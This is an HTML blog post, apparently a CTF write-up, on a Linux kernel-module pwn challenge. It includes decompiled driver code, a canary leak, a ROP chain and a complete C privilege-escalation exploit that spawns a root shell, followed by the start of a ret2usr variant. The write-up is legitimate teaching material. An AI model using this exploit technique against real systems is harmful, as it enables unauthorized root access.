@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>Kernel_Pwn_TWO | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="kernel_pwn">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel_Pwn_TWO">
+<meta property="og:url" content="http://yoursite.com/2019/03/25/kernel_pwn2/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="kernel_pwn">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/kernel_pwn2/66F75583-E877-4429-9D09-2ECFA2BED585.png">
+<meta property="og:image" content="http://yoursite.com/kernel_pwn2/0AF6438B-1DF5-40D3-80C9-4A461C532068.png">
+<meta property="og:image" content="http://yoursite.com/kernel_pwn2/E43FD602-07D0-4AE1-B9C9-9773FCCC9501.png">
+<meta property="og:updated_time" content="2019-03-26T03:21:06.672Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kernel_Pwn_TWO">
+<meta name="twitter:description" content="kernel_pwn">
+<meta name="twitter:image" content="http://yoursite.com/kernel_pwn2/66F75583-E877-4429-9D09-2ECFA2BED585.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP："><span class="toc-text">ROP：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec："><span class="toc-text">Checksec：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-ioctl："><span class="toc-text">core_ioctl：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-write："><span class="toc-text">core_write：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-read："><span class="toc-text">core_read：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-copy-func："><span class="toc-text">core_copy_func：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用流程："><span class="toc-text">利用流程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ret2usr："><span class="toc-text">Ret2usr：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Fetch："><span class="toc-text">Double Fetch：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chk-range-not-ok："><span class="toc-text">_chk_range_not_ok：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-ioctl："><span class="toc-text">baby_ioctl：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP：-1"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-kernel_pwn2" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Kernel_Pwn_TWO</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.03.25</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>接着上篇说的，这篇主要讨论一下ROP构造以及Double Fetch的利用。上一篇中Bypass smep的一部分构造没有明白的，在这篇中会得到详细的解答。</p>
+<h2 id="ROP："><a href="#ROP：" class="headerlink" title="ROP："></a>ROP：</h2><p>题目（见附件）照常给了三个文件，照样常规流程来，先把硬盘镜像给解压了，再看看start.sh文件启动内核的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
+<p>开了kaslr保护。相当于用户态pwn的aslr地址随机化。</p>
+<p>再看看镜像文件里的init文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 2000 /bin/sh</span><br><span class="line">echo &apos;sh end!\n&apos;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<p>看到了这一句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br></pre></td></tr></table></figure>
+<p>可以直接在tmp目录下拿到<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址。不需要root权限。</p>
+<p>还有这一句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poweroff -d 120 -f &amp;</span><br></pre></td></tr></table></figure>
+<p>定时关机的命令，为了方便调试，把这一句给删掉。</p>
+<p>镜像文件里面还有一个sh文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1</span><br></pre></td></tr></table></figure>
+<p>看来是打包镜像的命令了，所以我们可以利用它来重新打包我们的镜像。</p>
+<p>继续看驱动文件，来找找驱动程序的利用点。</p>
+<h3 id="Checksec："><a href="#Checksec：" class="headerlink" title="Checksec："></a>Checksec：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player checksec core.ko </span><br><span class="line">[*] &apos;/media/psf/Downloads/give_to_player/core.ko&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
+<h3 id="core-ioctl："><a href="#core-ioctl：" class="headerlink" title="core_ioctl："></a>core_ioctl：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rbx</span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  switch ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    case 1719109787:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      break;</span><br><span class="line">    case 1719109788:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      break;</span><br><span class="line">    case 1719109786:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显的选择结构，为1719109788时设置off的值。</p>
+<h3 id="core-write："><a href="#core-write：" class="headerlink" title="core_write："></a>core_write：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // rbx</span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  if ( v3 &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, a2, v3) )</span><br><span class="line">    return (unsigned int)v3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  return 4294967282LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>向name字段输入。</p>
+<h3 id="core-read："><a href="#core-read：" class="headerlink" title="core_read："></a>core_read：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall core_read(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // rbx</span><br><span class="line">  __int64 *v2; // rdi</span><br><span class="line">  signed __int64 i; // rcx</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  __int64 v5; // [rsp+0h] [rbp-50h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+40h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(0x28u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  for ( i = 16LL; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = 0;</span><br><span class="line">    v2 = (__int64 *)((char *)v2 + 4);</span><br><span class="line">  &#125;</span><br><span class="line">  strcpy((char *)&amp;v5, &quot;Welcome to the QWB CTF challenge.\n&quot;);</span><br><span class="line">  result = copy_to_user(v1, (char *)&amp;v5 + off, 64LL);        // leak</span><br><span class="line">  if ( !result )</span><br><span class="line">    return __readgsqword(0x28u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>&amp;v5 + off</code>在栈空间中，且off由我们设置，所以我们可以泄漏出canary的值来绕过canary。<code>copy_to_user(v1, (char *)&amp;v5 + off, 64LL)</code>中v1为用户空间的空间地址。</p>
+<h3 id="core-copy-func："><a href="#core-copy-func：" class="headerlink" title="core_copy_func："></a>core_copy_func：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall core_copy_func(signed __int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-50h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+40h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(0x28u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  if ( a1 &gt; 63 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = 0LL;</span><br><span class="line">    qmemcpy(&amp;v2, &amp;name, (unsigned __int16)a1);  // overflow ------&gt; rop</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的漏洞点不太容易注意到，这里的函数参数a1即输入是八字节的有符号整数，而在<code>qmemcpy</code>函数中则是双字节的无符号整数，所以当设置<code>a1=0xffffffffffff0200</code>即可绕过<code>a1&gt;63</code>的检查并在<code>qmemcpy</code>中得到a1为0x0200的值。并且v2为栈中的值，超长复制即可溢出。从name字段复制，name字段的内容是我们可控的，所以利用点就很容易可以得到。</p>
+<h4 id="利用流程："><a href="#利用流程：" class="headerlink" title="利用流程："></a>利用流程：</h4><ol>
+<li>设置<code>off</code>的值</li>
+<li>调用core_read泄漏出canary的值</li>
+<li>调用core_write往<code>name</code>字段构造ROP</li>
+<li>调用core_copy_func发生溢出劫持控制流</li>
+</ol>
+<p>先随意设置一个off的值再去调试看看gdb中canary的位置，我设置了off为0x40：</p>
+<p><img src="/kernel_pwn2/66F75583-E877-4429-9D09-2ECFA2BED585.png" alt="66F75583-E877-4429-9D09-2ECFA2BED585"></p>
+<p>再看看栈：</p>
+<p><img src="/kernel_pwn2/0AF6438B-1DF5-40D3-80C9-4A461C532068.png" alt="0AF6438B-1DF5-40D3-80C9-4A461C532068"></p>
+<p>经后面调试判断比较canary时可以得知上图箭头所指处就是canary的值。所以我们就可以设置off为0x40泄漏得知canary的值。</p>
+<p>这下后面的rop构造就和我们以往做pwn时一样构造就可以了。kernel pwn是为了提权，所以我们需要调用<code>commit_creds(prepare_kernel_cred(0))</code>就可提权。况且commit_creds和prepare_kernel_cred的函数地址我们从上面了解到可以从tmp目录下直接得到。我们需要这样构造rop：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rdi;ret</span><br><span class="line">0</span><br><span class="line">prepare_kernel_cred</span><br><span class="line">mov rdi,rax;ret</span><br><span class="line">commit_creds</span><br></pre></td></tr></table></figure>
+<p>但是从vmlinux中提取出来的rop没有<code>mov rdi,rax;ret</code>，所以我们仍可以换一种方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop rdx;ret</span><br><span class="line">commit_creds</span><br><span class="line">mov rdi,rax;jmp rdx</span><br><span class="line">或</span><br><span class="line">pop rdx;ret</span><br><span class="line">pop rcx;ret</span><br><span class="line">mov rdi,rax;call rdx</span><br><span class="line">commit_creds</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的一个点就是程序是开了kaslr的。所以这些从vmlinux中找的rop都不是真实地址，需要加上offset偏移才行，而这里的偏移可以用vmlinux中查得的<code>prepare_kernel_cred</code>地址和qemu中的<code>prepare_kernel_cred</code>相减即可得到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接查看得地址</span><br><span class="line">pwndbg&gt; p prepare_kernel_cred </span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xffffffff8109cce0 &lt;prepare_kernel_cred&gt;</span><br></pre></td></tr></table></figure>
+<p>所以在vmlinux中查的rop都需要加上offset才为真实地址。</p>
+<p>所构造的rop如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">unsigned long int rop_content[] = &#123;</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">canary_,</span><br><span class="line">0x9090909090909090,</span><br><span class="line">0xffffffff81000b2f+offset_size, //pop rdi;ret</span><br><span class="line">0x0,</span><br><span class="line">pkd_addr,</span><br><span class="line">0xffffffff810a0f49+offset_size, //pop rdx;ret</span><br><span class="line">cc_addr,</span><br><span class="line">0xffffffff8106a6d2+offset_size, //mov rdi,rax;jmp rdx</span><br><span class="line">0xffffffff81a012da+offset_size, //swapgs;popfq;ret</span><br><span class="line">0,</span><br><span class="line">0xffffffff81050ac2+offset_size, //iretq;</span><br><span class="line">(unsigned long)getshell,</span><br><span class="line">user_cs,</span><br><span class="line">user_flag,</span><br><span class="line">user_rsp,</span><br><span class="line">user_ss</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>下图中的<code>swapgs;popfq;ret</code>阶段是提权的必要操作，毕竟我们已经利用上面的函数提权完了，接下来要做的事情就是从内核态转回用户态了，所以需要恢复几个必要寄存器的值。</p>
+<p>这里还需要注意的一个点就是调用<code>core_copy_func</code>函数时，传参不能直接传<code>-1</code>，经调试发现直接传<code>-1</code>会导致最终得到4字节的值，最终无法绕过上面所说的<code>&gt;63</code>。</p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long int user_cs,user_ss,user_rsp,user_flag;</span><br><span class="line"></span><br><span class="line">void save_state()&#123;</span><br><span class="line">    __asm__(&quot;mov user_cs,cs;&quot;</span><br><span class="line">            &quot;mov user_ss,ss;&quot;</span><br><span class="line">            &quot;mov user_rsp,rsp;&quot;</span><br><span class="line">            &quot;pushf;&quot;</span><br><span class="line">            &quot;pop user_flag;&quot;</span><br><span class="line">           );</span><br><span class="line">    puts(&quot;[*]Save the state!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getshell()&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    unsigned long int *tcach = (unsigned long int *)malloc(0x40);</span><br><span class="line">    </span><br><span class="line">    unsigned long int pkd_addr,cc_addr;</span><br><span class="line">    scanf(&quot;%lx&quot;,&amp;pkd_addr);</span><br><span class="line">    fflush(stdin);</span><br><span class="line">    printf(&quot;input the cc_addr:\n&quot;);</span><br><span class="line">    scanf(&quot;%lx&quot;,&amp;cc_addr);</span><br><span class="line"></span><br><span class="line">    int fd = open(&quot;/proc/core&quot;,2);</span><br><span class="line"></span><br><span class="line">    ioctl(fd,1719109788,0x40);</span><br><span class="line">    ioctl(fd,1719109787,tcach);</span><br><span class="line">    unsigned long canary_ = *tcach;</span><br><span class="line">    //unsigned long vm_base = *(tcach+0x10) - 0x19b;</span><br><span class="line">    printf(&quot;leak canary:%x\n&quot;,canary_);</span><br><span class="line">    //printf(&quot;leak vm_base:%p&quot;,vm_base);</span><br><span class="line">    </span><br><span class="line">    unsigned long offset_size = pkd_addr - 0xffffffff8109cce0;// qemu addr - local addr</span><br><span class="line">    </span><br><span class="line">    //ret_offset = 0x50 canary = 0x40</span><br><span class="line">    unsigned long int rop_content[] = &#123;</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    canary_,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0xffffffff81000b2f+offset_size, //pop rdi;ret</span><br><span class="line">    0x0,</span><br><span class="line">    pkd_addr,</span><br><span class="line">    0xffffffff810a0f49+offset_size, //pop rdx;ret</span><br><span class="line">    cc_addr,</span><br><span class="line">    0xffffffff8106a6d2+offset_size, //mov rdi,rax;jmp rdx</span><br><span class="line">    0xffffffff81a012da+offset_size, //swapgs;popfq;ret</span><br><span class="line">    0,</span><br><span class="line">    0xffffffff81050ac2+offset_size, //iretq;</span><br><span class="line">    (unsigned long)getshell,</span><br><span class="line">    user_cs,</span><br><span class="line">    user_flag,</span><br><span class="line">    user_rsp,</span><br><span class="line">    user_ss</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    write(fd,rop_content,0xf0);</span><br><span class="line">    ioctl(fd,1719109786,0xffffffff000000f0);//-1 will be 4 size</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Ret2usr："><a href="#Ret2usr：" class="headerlink" title="Ret2usr："></a>Ret2usr：</h2><p>这个方法其实跟上面所说的ROP基本没有区别，最根本的区别就是把上面所需要rop构造出来的提权过程<code>commit_creds(prepare_kernel_cred(0))</code>直接写了一个函数，从而不需要rop调用，直接调用函数即可。该函数写成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void getroot()&#123;</span><br><span class="line">    char* (*pkc)(int) = prepare_kernel_cred;</span><br><span class="line">    void (*cc)(char*) = commit_cred;</span><br><span class="line">    (*cc)((*pkc)(0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以构造rop时可以直接这样构造：</p>
